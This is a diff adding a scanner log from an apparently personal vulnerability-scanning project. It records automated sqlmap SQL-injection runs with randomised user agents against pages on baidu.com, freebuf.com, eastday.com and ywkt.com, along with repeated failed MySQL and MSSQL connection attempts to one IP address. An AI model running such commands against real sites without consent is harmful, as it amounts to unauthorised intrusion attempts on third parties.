@@ -1,0 +1,634 @@
+-------------------------------------
+2018-12-10:17:30:53   F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.95\lib\python.exe F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.95\lib\sqlmap\sqlmap.py -u http://www.baidu.com/gaoji/preferences*.html --batch --thread=10 --random-agent
+-------------------------------------
+2018-12-10:17:31:16           ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.2.11.6#dev}
+|_ -| . [.]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:30:54 /2018-12-10/
+
+[17:30:54] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; fr; rv:1.7.12) Gecko/20050922 Fedora/1.0.7-1.1.fc4 Firefox/1.0.7' from file 'F:\CODE\涓汉浣滃搧婧愪唬鐮乗涓汉婕忔壂椤圭洰\Langzi_瀹夊叏宸¤埅0.95\lib\sqlmap\txt\user-agents.txt'
+custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
+[17:30:55] [INFO] testing connection to the target URL
+[17:30:55] [INFO] checking if the target is protected by some kind of WAF/IPS
+[17:30:55] [INFO] testing if the target URL content is stable
+[17:30:56] [INFO] target URL content is stable
+[17:30:56] [INFO] testing if URI parameter '#1*' is dynamic
+sqlmap got a 302 redirect to 'http://www.baidu.com/search/error.html'. Do you want to follow? [Y/n] Y
+[17:30:56] [INFO] URI parameter '#1*' appears to be dynamic
+[17:30:56] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+[17:30:56] [INFO] testing for SQL injection on URI parameter '#1*'
+[17:30:57] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[17:30:58] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[17:30:58] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[17:30:59] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[17:31:00] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[17:31:01] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[17:31:02] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[17:31:02] [INFO] testing 'MySQL inline queries'
+[17:31:02] [INFO] testing 'PostgreSQL inline queries'
+[17:31:02] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[17:31:02] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[17:31:03] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[17:31:03] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[17:31:04] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[17:31:05] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[17:31:06] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[17:31:06] [INFO] testing 'Oracle AND time-based blind'
+[17:31:07] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[17:31:16] [WARNING] URI parameter '#1*' does not seem to be injectable
+[17:31:16] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')
+
+[*] ending @ 17:31:16 /2018-12-10/
+
+
+-------------------------------------
+2018-12-10:17:42:39   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:42:49   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:42:59   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:43:09   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:43:19   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:43:29   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:43:39   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:43:49   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:43:59   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:44:09   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:44:19   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:44:29   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:44:39   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:44:49   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:44:59   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:45:09   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:45:19   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:45:29   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:45:39   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:45:49   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:45:59   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:46:09   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:46:20   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:46:30   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:46:40   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:46:50   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:47:00   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:47:10   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:47:20   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:47:30   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:47:40   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:47:50   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:48:00   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:48:10   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:48:20   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:48:30   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:48:40   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:48:50   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:49:00   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:49:10   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:49:20   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:49:30   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:49:40   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:49:50   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:50:00   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:50:10   [WARNING ERROR](2003, "Can't connect to MySQL server on '58.217.200.13' (timed out)")
+-------------------------------------
+2018-12-10:17:51:10   [WARNING ERROR](20009, 'DB-Lib error message 20009, severity 9:\nUnable to connect: Adaptive Server is unavailable or does not exist (58.217.200.13:1433)\nNet-Lib error during Unknown error (10060)\n')
+-------------------------------------
+2018-12-10:17:52:10   [WARNING ERROR](20009, 'DB-Lib error message 20009, severity 9:\nUnable to connect: Adaptive Server is unavailable or does not exist (58.217.200.13:1433)\nNet-Lib error during Unknown error (10060)\n')
+-------------------------------------
+2018-12-10:17:53:10   [WARNING ERROR](20009, 'DB-Lib error message 20009, severity 9:\nUnable to connect: Adaptive Server is unavailable or does not exist (58.217.200.13:1433)\nNet-Lib error during Unknown error (10060)\n')
+-------------------------------------
+2018-12-10:17:54:10   [WARNING ERROR](20009, 'DB-Lib error message 20009, severity 9:\nUnable to connect: Adaptive Server is unavailable or does not exist (58.217.200.13:1433)\nNet-Lib error during Unknown error (10060)\n')
+-------------------------------------
+2018-12-10:18:34:58   F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.95\lib\python.exe F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.95\lib\sqlmap\sqlmap.py -u https://www.freebuf.com/articles/system/190926*.html --batch --thread=10 --random-agent
+-------------------------------------
+2018-12-10:18:36:39           ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.2.11.6#dev}
+|_ -| . ["]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:35:07 /2018-12-10/
+
+[18:35:07] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.15) Gecko/20110303 Firefox/3.6.15 (.NET CLR 3.5.30729)' from file 'F:\CODE\涓汉浣滃搧婧愪唬鐮乗涓汉婕忔壂椤圭洰\Langzi_瀹夊叏宸¤埅0.95\lib\sqlmap\txt\user-agents.txt'
+custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
+[18:35:09] [INFO] testing connection to the target URL
+[18:35:11] [INFO] checking if the target is protected by some kind of WAF/IPS
+[18:35:13] [INFO] testing if the target URL content is stable
+[18:35:14] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[18:35:14] [INFO] testing if URI parameter '#1*' is dynamic
+sqlmap got a 301 redirect to 'https://www.freebuf.com/news/4503.html/attachment/8-8'. Do you want to follow? [Y/n] Y
+[18:35:16] [INFO] URI parameter '#1*' appears to be dynamic
+[18:35:16] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+[18:35:17] [INFO] testing for SQL injection on URI parameter '#1*'
+[18:35:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[18:35:23] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[18:35:25] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[18:35:27] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[18:35:31] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[18:35:34] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[18:35:37] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[18:35:38] [INFO] testing 'MySQL inline queries'
+[18:35:39] [INFO] testing 'PostgreSQL inline queries'
+[18:35:39] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[18:35:40] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[18:35:42] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[18:35:45] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[18:35:48] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[18:35:50] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[18:35:53] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[18:35:57] [INFO] testing 'Oracle AND time-based blind'
+[18:36:00] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[18:36:39] [WARNING] URI parameter '#1*' does not seem to be injectable
+[18:36:39] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')
+[18:36:39] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 125 times
+
+[*] ending @ 18:36:39 /2018-12-10/
+
+
+-------------------------------------
+2018-12-10:19:07:05   [WARNING ERROR]HTTPConnectionPool(host='news.eastday.com', port=80): Read timed out. (read timeout=5)
+-------------------------------------
+2018-12-10:19:07:22   [WARNING ERROR]HTTPConnectionPool(host='happychunjie.eastday.com', port=80): Max retries exceeded with url: /news/index?id=251 (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x0000000007124EB8>, 'Connection to happychunjie.eastday.com timed out. (connect timeout=5)'))
+-------------------------------------
+2018-12-10:19:07:30   [WARNING ERROR]HTTPConnectionPool(host='happychunjie.eastday.com', port=80): Max retries exceeded with url: /news/index?id=247 (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000000000756CDA0>, 'Connection to happychunjie.eastday.com timed out. (connect timeout=5)'))
+-------------------------------------
+2018-12-10:19:07:35   [WARNING ERROR]HTTPConnectionPool(host='happychunjie.eastday.com', port=80): Max retries exceeded with url: /news/index?id=249 (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000000000756CF98>, 'Connection to happychunjie.eastday.com timed out. (connect timeout=5)'))
+-------------------------------------
+2018-12-10:19:07:40   [WARNING ERROR]HTTPConnectionPool(host='happychunjie.eastday.com', port=80): Max retries exceeded with url: /news/index?id=248 (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x000000000756CFD0>, 'Connection to happychunjie.eastday.com timed out. (connect timeout=5)'))
+-------------------------------------
+2018-12-10:19:07:40   F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.95\lib\python.exe F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.95\lib\sqlmap\sqlmap.py -u http://eastday.com///images/index2014/wzainfo*.html --batch --thread=10 --random-agent
+-------------------------------------
+2018-12-10:19:07:45           ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.2.11.6#dev}
+|_ -| . [(]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:07:41 /2018-12-10/
+
+[19:07:41] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; en-US) AppleWebKit/533.2 (KHTML, like Gecko) Chrome/5.0.343.0 Safari/533.2' from file 'F:\CODE\涓汉浣滃搧婧愪唬鐮乗涓汉婕忔壂椤圭洰\Langzi_瀹夊叏宸¤埅0.95\lib\sqlmap\txt\user-agents.txt'
+custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
+[19:07:41] [INFO] testing connection to the target URL
+[19:07:41] [INFO] checking if the target is protected by some kind of WAF/IPS
+[19:07:41] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
+do you want sqlmap to try to detect backend WAF/IPS? [y/N] N
+[19:07:41] [WARNING] dropping timeout to 10 seconds (i.e. '--timeout=10')
+[19:07:41] [INFO] testing if the target URL content is stable
+[19:07:42] [INFO] target URL content is stable
+[19:07:42] [INFO] testing if URI parameter '#1*' is dynamic
+[19:07:42] [WARNING] URI parameter '#1*' does not appear to be dynamic
+[19:07:42] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+[19:07:42] [INFO] testing for SQL injection on URI parameter '#1*'
+[19:07:42] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[19:07:43] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[19:07:43] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[19:07:43] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[19:07:43] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[19:07:43] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[19:07:43] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[19:07:43] [INFO] testing 'MySQL inline queries'
+[19:07:43] [INFO] testing 'PostgreSQL inline queries'
+[19:07:43] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[19:07:43] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[19:07:43] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[19:07:43] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[19:07:43] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[19:07:43] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[19:07:43] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[19:07:44] [INFO] testing 'Oracle AND time-based blind'
+[19:07:44] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[19:07:45] [WARNING] URI parameter '#1*' does not seem to be injectable
+[19:07:45] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')
+[19:07:45] [WARNING] HTTP error codes detected during run:
+400 (Bad Request) - 2 times, 404 (Not Found) - 124 times, 405 (Method Not Allowed) - 1 times
+
+[*] ending @ 19:07:45 /2018-12-10/
+
+
+-------------------------------------
+2018-12-10:19:08:00   [WARNING ERROR]HTTPConnectionPool(host='happychunjie.eastday.com', port=80): Max retries exceeded with url: /news/index?id=251 (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x00000000076E0B00>, 'Connection to happychunjie.eastday.com timed out. (connect timeout=5)'))
+-------------------------------------
+2018-12-10:19:08:08   [WARNING ERROR]HTTPConnectionPool(host='happychunjie.eastday.com', port=80): Max retries exceeded with url: /news/index?id=247 (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x00000000076E0630>, 'Connection to happychunjie.eastday.com timed out. (connect timeout=5)'))
+-------------------------------------
+2018-12-10:19:08:13   [WARNING ERROR]HTTPConnectionPool(host='happychunjie.eastday.com', port=80): Max retries exceeded with url: /news/index?id=249 (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x00000000076E0EF0>, 'Connection to happychunjie.eastday.com timed out. (connect timeout=5)'))
+-------------------------------------
+2018-12-10:19:08:18   [WARNING ERROR]HTTPConnectionPool(host='happychunjie.eastday.com', port=80): Max retries exceeded with url: /news/index?id=248 (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x00000000076E04E0>, 'Connection to happychunjie.eastday.com timed out. (connect timeout=5)'))
+-------------------------------------
+2018-12-10:19:08:19   [WARNING ERROR]HTTP Error 405: Method Not Allowed
+-------------------------------------
+2018-12-10:19:13:34   [WARNING ERROR](2003, "Can't connect to MySQL server on '222.73.244.10' (timed out)")
+-------------------------------------
+2018-12-10:19:16:56   [WARNING ERROR]HTTPConnectionPool(host='happychunjie.eastday.com', port=80): Max retries exceeded with url: /news/index?id=251 (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x0000000006A36048>, 'Connection to happychunjie.eastday.com timed out. (connect timeout=5)'))
+-------------------------------------
+2018-12-10:19:17:06   [WARNING ERROR]HTTPConnectionPool(host='happychunjie.eastday.com', port=80): Max retries exceeded with url: /news/index?id=247 (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x0000000006A36518>, 'Connection to happychunjie.eastday.com timed out. (connect timeout=5)'))
+-------------------------------------
+2018-12-10:19:17:11   [WARNING ERROR]HTTPConnectionPool(host='happychunjie.eastday.com', port=80): Max retries exceeded with url: /news/index?id=249 (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x0000000006A36DA0>, 'Connection to happychunjie.eastday.com timed out. (connect timeout=5)'))
+-------------------------------------
+2018-12-10:19:17:16   [WARNING ERROR]HTTPConnectionPool(host='happychunjie.eastday.com', port=80): Max retries exceeded with url: /news/index?id=248 (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x0000000006A36160>, 'Connection to happychunjie.eastday.com timed out. (connect timeout=5)'))
+-------------------------------------
+2018-12-10:19:17:16   F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.95\lib\python.exe F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.95\lib\sqlmap\sqlmap.py -u http://news.eastday.com/c/20181207/u1a14438074*.html --batch --thread=10 --random-agent
+-------------------------------------
+2018-12-10:19:17:39           ___
+       __H__
+ ___ ___[.]_____ ___ ___  {1.2.11.6#dev}
+|_ -| . [)]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:17:17 /2018-12-10/
+
+[19:17:17] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.107 Safari/534.13 v1416748405.3871' from file 'F:\CODE\涓汉浣滃搧婧愪唬鐮乗涓汉婕忔壂椤圭洰\Langzi_瀹夊叏宸¤埅0.95\lib\sqlmap\txt\user-agents.txt'
+custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
+[19:17:17] [INFO] testing connection to the target URL
+[19:17:17] [INFO] checking if the target is protected by some kind of WAF/IPS
+[19:17:17] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
+do you want sqlmap to try to detect backend WAF/IPS? [y/N] N
+[19:17:17] [WARNING] dropping timeout to 10 seconds (i.e. '--timeout=10')
+[19:17:17] [INFO] testing if the target URL content is stable
+[19:17:18] [INFO] target URL content is stable
+[19:17:18] [INFO] testing if URI parameter '#1*' is dynamic
+[19:17:18] [WARNING] URI parameter '#1*' does not appear to be dynamic
+[19:17:18] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+[19:17:18] [INFO] testing for SQL injection on URI parameter '#1*'
+[19:17:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[19:17:29] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[19:17:29] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[19:17:30] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[19:17:30] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+[19:17:31] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+[19:17:31] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
+[19:17:31] [INFO] testing 'MySQL inline queries'
+[19:17:31] [INFO] testing 'PostgreSQL inline queries'
+[19:17:31] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
+[19:17:32] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[19:17:32] [CRITICAL] considerable lagging has been detected in connection response(s). Please use as high value for option '--time-sec' as possible (e.g. 10 or more)
+[19:17:32] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+[19:17:32] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+[19:17:32] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
+[19:17:33] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[19:17:33] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+[19:17:34] [INFO] testing 'Oracle AND time-based blind'
+[19:17:34] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+[19:17:39] [WARNING] URI parameter '#1*' does not seem to be injectable
+[19:17:39] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment')
+[19:17:39] [WARNING] HTTP error codes detected during run:
+400 (Bad Request) - 3 times, 404 (Not Found) - 123 times, 405 (Method Not Allowed) - 1 times
+
+[*] ending @ 19:17:39 /2018-12-10/
+
+
+-------------------------------------
+2018-12-10:19:17:53   [WARNING ERROR]HTTPConnectionPool(host='happychunjie.eastday.com', port=80): Max retries exceeded with url: /news/index?id=251 (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x00000000071B02E8>, 'Connection to happychunjie.eastday.com timed out. (connect timeout=5)'))
+-------------------------------------
+2018-12-10:19:18:01   [WARNING ERROR]HTTPConnectionPool(host='happychunjie.eastday.com', port=80): Max retries exceeded with url: /news/index?id=247 (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x00000000071B0C88>, 'Connection to happychunjie.eastday.com timed out. (connect timeout=5)'))
+-------------------------------------
+2018-12-10:19:18:06   [WARNING ERROR]HTTPConnectionPool(host='happychunjie.eastday.com', port=80): Max retries exceeded with url: /news/index?id=249 (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x00000000071B0668>, 'Connection to happychunjie.eastday.com timed out. (connect timeout=5)'))
+-------------------------------------
+2018-12-10:19:18:11   [WARNING ERROR]HTTPConnectionPool(host='happychunjie.eastday.com', port=80): Max retries exceeded with url: /news/index?id=248 (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x00000000071B0F98>, 'Connection to happychunjie.eastday.com timed out. (connect timeout=5)'))
+-------------------------------------
+2018-12-10:19:18:21   [WARNING ERROR]HTTP Error 403: Forbidden
+-------------------------------------
+2018-12-10:19:24:09   F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.95\lib\python.exe F:\CODE\个人作品源代码\个人漏扫项目\Langzi_安全巡航0.95\lib\sqlmap\sqlmap.py -u https://www.ywkt.com/ArticleShow.asp?ArticleID=51741 --batch --thread=10 --random-agent
+-------------------------------------
+2018-12-10:19:24:30           ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.2.11.6#dev}
+|_ -| . [,]     | .'| . |
+|___|_  [(]_|_|_|__,|  _|
+      |_|V          |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 19:24:10 /2018-12-10/
+
+[19:24:10] [INFO] fetched random HTTP User-Agent header value 'Opera/9.23 (Windows NT 5.1; U; da)' from file 'F:\CODE\涓汉浣滃搧婧愪唬鐮乗涓汉婕忔壂椤圭洰\Langzi_瀹夊叏宸¤埅0.95\lib\sqlmap\txt\user-agents.txt'
+[19:24:11] [INFO] testing connection to the target URL
